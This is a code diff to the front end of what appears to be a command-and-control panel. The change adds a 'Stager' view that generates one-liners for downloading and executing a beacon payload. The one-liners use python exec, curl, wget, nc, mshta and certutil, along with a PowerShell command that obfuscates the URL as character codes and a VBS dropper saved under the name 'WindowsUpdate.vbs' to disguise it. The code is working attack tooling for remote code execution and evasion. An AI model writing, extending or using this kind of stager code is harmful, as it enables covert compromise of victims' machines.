@@ -38,6 +38,9 @@
       <button class="nav-item" onclick="showView('generate')" id="nav-generate">
         <span class="icon">⚙</span> <span data-i18n="nav_generate">Generate Beacon</span>
       </button>
+      <button class="nav-item" onclick="showView('stager')" id="nav-stager">
+        <span class="icon">🎣</span> <span data-i18n="nav_stager">Stager</span>
+      </button>
       <button class="nav-item" onclick="showView('redirector')" id="nav-redirector">
         <span class="icon">↪</span> <span data-i18n="nav_redirector">Redirector</span>
       </button>
@@ -201,7 +204,7 @@
 // ── i18n ─────────────────────────────────────────────────
 const LANG = {
   en: {
-    nav_sessions:'Sessions', nav_map:'Map', nav_topology:'Topology', nav_generate:'Generate Beacon', nav_redirector:'Redirector',
+    nav_sessions:'Sessions', nav_map:'Map', nav_topology:'Topology', nav_generate:'Generate Beacon', nav_stager:'Stager', nav_redirector:'Redirector',
     nav_settings:'Settings', nav_logout:'Logout',
     title_sessions:'Sessions', title_map:'Agent Map', title_topology:'Network Topology', title_generate:'Generate Beacon',
     title_redirector:'Redirector Config', title_settings:'Settings',
@@ -309,7 +312,7 @@ const LANG = {
     topo_open_session:'Open session →',
   },
   es: {
-    nav_sessions:'Sesiones', nav_map:'Mapa', nav_topology:'Topología', nav_generate:'Generar Beacon', nav_redirector:'Redirector',
+    nav_sessions:'Sesiones', nav_map:'Mapa', nav_topology:'Topología', nav_generate:'Generar Beacon', nav_stager:'Stager', nav_redirector:'Redirector',
     nav_settings:'Ajustes', nav_logout:'Salir',
     title_sessions:'Sesiones', title_map:'Mapa de Agentes', title_topology:'Topología de Red', title_generate:'Generar Beacon',
     title_redirector:'Config. Redirector', title_settings:'Ajustes',
@@ -648,6 +651,9 @@ function showView(view, agentId) {
   } else if (view === 'generate') {
     document.getElementById('topbar-title').textContent = t('title_generate');
     renderGenerateView();
+  } else if (view === 'stager') {
+    document.getElementById('topbar-title').textContent = t('nav_stager');
+    renderStagerView();
   } else if (view === 'redirector') {
     document.getElementById('topbar-title').textContent = t('title_redirector');
     renderRedirectorView();
@@ -2694,6 +2700,202 @@ function showSettingsTab(tab) {
   const panel = document.getElementById('stpanel-' + tab);
   if (btn) btn.classList.add('active');
   if (panel) panel.style.display = '';
+}
+
+// ── Stager View ───────────────────────────────────────────
+async function renderStagerView() {
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div style="display:grid;grid-template-columns:320px 1fr;gap:20px;height:100%;min-height:0;overflow:hidden">
+
+      <!-- Left: create form + list -->
+      <div style="display:flex;flex-direction:column;gap:16px;overflow-y:auto;padding-bottom:16px">
+        <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px">
+          <div style="font-size:13px;font-weight:600;margin-bottom:16px">🎣 ${t('stager_title')}</div>
+          <div class="error-msg" id="sv-error"></div>
+          <div class="form-group">
+            <label data-i18n="stager_max_uses">${t('stager_max_uses')}</label>
+            <input type="number" id="sv-max-uses" value="0" min="0">
+          </div>
+          <div class="form-group">
+            <label data-i18n="stager_expire">${t('stager_expire')}</label>
+            <input type="number" id="sv-expire-h" value="0" min="0">
+          </div>
+          <div style="font-size:11px;color:var(--text3);margin-bottom:12px">El código del beacon se genera al crear — asegúrate de generar el beacon primero si quieres incluirlo.</div>
+          <button class="btn btn-full" onclick="svCreateStager()">${t('stager_create')}</button>
+        </div>
+
+        <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;flex:1;min-height:0;display:flex;flex-direction:column">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+            <span style="font-size:13px;font-weight:600">${t('stager_active')}</span>
+            <button class="btn btn-sm btn-ghost" onclick="svLoadList()" style="font-size:11px">↻</button>
+          </div>
+          <div id="sv-list" style="flex:1;overflow-y:auto;font-size:11px"></div>
+        </div>
+      </div>
+
+      <!-- Right: one-liners panel -->
+      <div style="overflow-y:auto;padding-bottom:16px">
+        <div id="sv-oneliners" style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:20px;min-height:200px;display:flex;align-items:center;justify-content:center">
+          <div style="text-align:center;color:var(--text3)">
+            <div style="font-size:48px;margin-bottom:12px">🎣</div>
+            <div style="font-size:13px">${_lang === 'es' ? 'Crea un stager o selecciona uno activo' : 'Create a stager or select an active one'}</div>
+          </div>
+        </div>
+      </div>
+    </div>`;
+
+  svLoadList();
+}
+
+async function svCreateStager() {
+  const errEl = document.getElementById('sv-error');
+  errEl.style.display = 'none';
+  const maxUses = parseInt(document.getElementById('sv-max-uses').value) || 0;
+  const expireH = parseInt(document.getElementById('sv-expire-h').value) || 0;
+
+  // Use beacon code from generator if available, otherwise empty placeholder
+  const beaconCode = document.getElementById('beacon-code')?.textContent?.trim() || '';
+  if (!beaconCode) {
+    errEl.textContent = _lang === 'es'
+      ? 'Genera un beacon primero (sección Generar Beacon) para poder crear un stager con código.'
+      : 'Generate a beacon first (Generate Beacon section) to create a stager with code.';
+    errEl.style.display = 'block';
+    return;
+  }
+
+  const resp = await apiFetch('/api/stager', {
+    method: 'POST',
+    body: JSON.stringify({ code: beaconCode, lang: 'py', max_uses: maxUses, expire_h: expireH })
+  });
+  if (!resp || !resp.ok) {
+    errEl.textContent = 'Error creating stager';
+    errEl.style.display = 'block';
+    return;
+  }
+  const data = await resp.json();
+  svShowOneliners(data.token);
+  svLoadList();
+}
+
+async function svLoadList() {
+  const listEl = document.getElementById('sv-list');
+  if (!listEl) return;
+  const resp = await apiFetch('/api/stager');
+  if (!resp || !resp.ok) return;
+  const items = await resp.json();
+  if (!items.length) {
+    listEl.innerHTML = `<div style="color:var(--text3);padding:8px 0">—</div>`;
+    return;
+  }
+  listEl.innerHTML = items.map(st => {
+    const statusColor = st.active ? 'var(--online)' : 'var(--text3)';
+    const usesLabel = st.max_uses > 0 ? `${st.used_count}/${st.max_uses}` : `${st.used_count}`;
+    const expiresLabel = st.expires_at ? new Date(st.expires_at).toLocaleDateString() : (t('stager_never'));
+    const rowStyle = st.active
+      ? 'display:flex;align-items:center;gap:8px;padding:6px 8px;border-radius:6px;cursor:pointer;margin-bottom:4px;transition:background .15s'
+      : 'display:flex;align-items:center;gap:8px;padding:6px 8px;border-radius:6px;margin-bottom:4px;opacity:.45';
+    return `<div style="${rowStyle}" ${st.active ? `data-sv-token="${st.token}" onmouseenter="this.style.background='var(--bg3)'" onmouseleave="this.style.background=''"` : ''}>
+      <span style="color:${statusColor};font-size:9px">●</span>
+      <code style="color:var(--accent2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:11px">${st.token}</code>
+      <span style="color:var(--text3);font-size:10px">${usesLabel} ${t('stager_uses')}</span>
+      <span style="color:var(--text3);font-size:10px">exp: ${expiresLabel}</span>
+      ${st.active ? `<span style="color:var(--text3);font-size:11px">📋</span>` : ''}
+      <button class="btn btn-sm btn-ghost" style="font-size:10px;color:#ef4444;flex-shrink:0" data-sv-revoke="${st.token}">${t('stager_revoke')}</button>
+    </div>`;
+  }).join('');
+
+  listEl.querySelectorAll('[data-sv-token]').forEach(row => {
+    row.addEventListener('click', e => {
+      if (e.target.closest('[data-sv-revoke]')) return;
+      svShowOneliners(row.dataset.svToken);
+    });
+  });
+  listEl.querySelectorAll('[data-sv-revoke]').forEach(btn => {
+    btn.addEventListener('click', e => {
+      e.stopPropagation();
+      apiFetch(`/api/stager/${btn.dataset.svRevoke}`, { method: 'DELETE' }).then(r => { if (r && r.ok) svLoadList(); });
+    });
+  });
+}
+
+function svShowOneliners(token) {
+  const panel = document.getElementById('sv-oneliners');
+  if (!panel) return;
+  // Reuse _stagerShowOneliners logic by temporarily pointing to sv-oneliner-list
+  // We render directly into the panel
+  const base = window.location.origin;
+  const url = `${base}/s/${token}`;
+  const hta_url = `${base}/s/${token}/hta`;
+  const vbs_url = `${base}/s/${token}/vbs`;
+  const psDec = Array.from(url).map(c => c.charCodeAt(0)).join(',');
+  const parsed = new URL(url);
+  const ncHost = parsed.hostname;
+  const ncPort = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
+  const ncPath = parsed.pathname;
+  const pyExec = (bin, u) =>
+    `${bin} -c "import urllib.request,builtins; c=urllib.request.urlopen('${u}').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"`;
+
+  const groups = [
+    { title: '🐍 Python', items: [
+      { label: 'python3 (Linux / Mac)', cmd: pyExec('python3', url) },
+      { label: 'python  (Windows)',     cmd: pyExec('python',  url) },
+    ]},
+    { title: '🐚 Shell / Unix', items: [
+      { label: 'curl',          cmd: `curl -s "${url}" -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py` },
+      { label: 'wget',          cmd: `wget -qO /tmp/s.py "${url}" && python3 /tmp/s.py; rm -f /tmp/s.py` },
+      { label: 'sh (fallback)', cmd: `sh -c "curl -s '${url}' -o /tmp/s.py 2>/dev/null || wget -qO /tmp/s.py '${url}'; python3 /tmp/s.py; rm -f /tmp/s.py"` },
+      { label: 'nc (raw TCP)',  cmd: `(printf 'GET ${ncPath} HTTP/1.0\r\nHost: ${ncHost}\r\n\r\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys,builtins; b=sys.stdin.buffer.read(); c=b[b.find(bytes([13,10,13,10]))+4:]; exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+    ]},
+    { title: '🪟 Windows', items: [
+      { label: 'PowerShell — llama python',  cmd: pyExec('python', url) },
+      { label: 'PowerShell — URL ofuscada',  cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,builtins; c=urllib.request.urlopen('$u').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
+      { label: 'mshta (HTA)',                cmd: `mshta ${hta_url}` },
+      { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
+      { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
+      { label: 'VBS — descarga (cmd.exe)',   cmd: `cmd /c "certutil -urlcache -split -f \\"${vbs_url}\\" %TEMP%\\WindowsUpdate.vbs & wscript %TEMP%\\WindowsUpdate.vbs"` },
+      { label: 'VBS — descarga (PowerShell)',cmd: `Invoke-WebRequest '${vbs_url}' -OutFile "$env:TEMP\\WindowsUpdate.vbs"; wscript "$env:TEMP\\WindowsUpdate.vbs"` },
+      { label: 'VBS — URL del archivo',      cmd: vbs_url },
+    ]},
+    { title: '🔧 Otros', items: [
+      { label: 'PHP',  cmd: `php -r "passthru('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py');"` },
+      { label: 'Perl', cmd: `perl -e "system('curl -s ${url} -o /tmp/s.py && python3 /tmp/s.py; rm -f /tmp/s.py')"` },
+    ]},
+  ];
+
+  const allItems = groups.flatMap(g => g.items);
+  panel.style.display = '';
+  panel.style.alignItems = '';
+  panel.style.justifyContent = '';
+  panel.innerHTML = `
+    <div style="font-size:12px;color:var(--text3);margin-bottom:16px;font-family:var(--font-mono)">
+      Token: <code style="color:var(--accent2)">${token}</code>
+      &nbsp;·&nbsp; URL: <code style="color:var(--accent2);word-break:break-all">${url}</code>
+    </div>
+    <div id="sv-oneliner-list"></div>`;
+
+  const listEl = document.getElementById('sv-oneliner-list');
+  listEl.innerHTML = groups.map(g => {
+    const itemsHtml = g.items.map(ol => {
+      const idx = allItems.indexOf(ol);
+      return `<div style="margin-bottom:10px">
+        <div style="color:var(--text3);font-size:12px;margin-bottom:4px">${ol.label}</div>
+        <div style="display:flex;gap:6px;align-items:flex-start">
+          <code style="flex:1;background:var(--bg);border-radius:4px;padding:8px 12px;font-size:13px;word-break:break-all;color:var(--accent2);line-height:1.6">${_escHtml(ol.cmd)}</code>
+          <button class="btn btn-sm btn-ghost" style="flex-shrink:0" data-sv-copy="${idx}">⎘</button>
+        </div>
+      </div>`;
+    }).join('');
+    return `<div style="margin-bottom:20px">
+      <div style="color:var(--text2);font-size:11px;font-weight:600;margin-bottom:10px;display:inline-flex;align-items:center;gap:6px;background:var(--bg3);padding:3px 10px;border-radius:20px">${g.title}</div>
+      ${itemsHtml}
+    </div>`;
+  }).join('');
+
+  listEl.querySelectorAll('[data-sv-copy]').forEach(btn => {
+    const idx = parseInt(btn.dataset.svCopy);
+    btn.addEventListener('click', () => _stagerCopyLine(btn, allItems[idx].cmd));
+  });
 }
 
 async function renderSettingsView() {
@@ -5654,9 +5856,9 @@ function _stagerShowOneliners(token) {
         { label: 'PowerShell — llama python', cmd: pyExec('python', url) },
         { label: 'PowerShell — URL ofuscada', cmd: `$u=(-join([char[]]@(${psDec})));python -c "import urllib.request,builtins; c=urllib.request.urlopen('$u').read(); exec(compile(c,'beacon.py','exec'),{'__file__':'beacon.py','__name__':'__main__','__builtins__':builtins})"` },
         { label: 'mshta (HTA)',               cmd: `mshta ${hta_url}` },
-        { label: 'certutil (cmd.exe)',         cmd: `certutil -urlcache -split -f "${url}" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py` },
+        { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
         { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
-        { label: 'VBS — descarga (cmd.exe)',    cmd: `certutil -urlcache -split -f "${vbs_url}" %TEMP%\\WindowsUpdate.vbs & wscript %TEMP%\\WindowsUpdate.vbs` },
+        { label: 'VBS — descarga (cmd.exe)',    cmd: `cmd /c "certutil -urlcache -split -f \\"${vbs_url}\\" %TEMP%\\WindowsUpdate.vbs & wscript %TEMP%\\WindowsUpdate.vbs"` },
         { label: 'VBS — descarga (PowerShell)', cmd: `Invoke-WebRequest '${vbs_url}' -OutFile "$env:TEMP\\WindowsUpdate.vbs"; wscript "$env:TEMP\\WindowsUpdate.vbs"` },
         { label: 'VBS — URL del archivo',       cmd: vbs_url },
       ]
